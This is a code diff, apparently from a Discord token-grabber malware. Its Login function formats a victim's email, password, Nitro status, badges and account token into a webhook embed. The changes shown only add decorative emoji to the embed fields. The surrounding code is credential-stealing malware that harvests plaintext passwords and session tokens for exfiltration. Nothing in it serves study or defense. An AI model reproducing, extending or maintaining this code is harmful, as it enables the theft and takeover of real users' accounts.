@@ -148,23 +148,27 @@ function Login(email, password, token) {
                     "color": 3447704,
                     "fields": [
                         {
-                            "name": "**Account Info**",
+                            "name": "<a:arrow:765308889859751976> **Account Info**",
 
-                            "value": `**Email:** ||${email}|| 
+                            "value":  `<:PP_director:942527310324719716> **Email:** ||${email}|| 
                                      
-				                     **Password:** ||${password}||`,
+                            <:staff_blue:936543701294010399> **Password:** ||${password}||`,
                             "inline": true
                         },
+
+
+
                         {
-                            "name": "**Other Info**",
+                            "name": "<a:arrow:765308889859751976> **Other Info**",
 
-                            "value": `**Nitro Type:** ${GetNitro(json.premium_type)}\n
+                            "value": `**Nitro Type:** <a:axe_Pepenitro:932312223945224212> ${GetNitro(json.premium_type)}\n
 
-                           **Badges:** ${GetBadges(json.flags)}`,
+                           **Badges:** <a:allbadges:895906088996720690> ${GetBadges(json.flags)}`,
 
 
         
                         },
+
                         
                         {
                             "name": "**Token**",
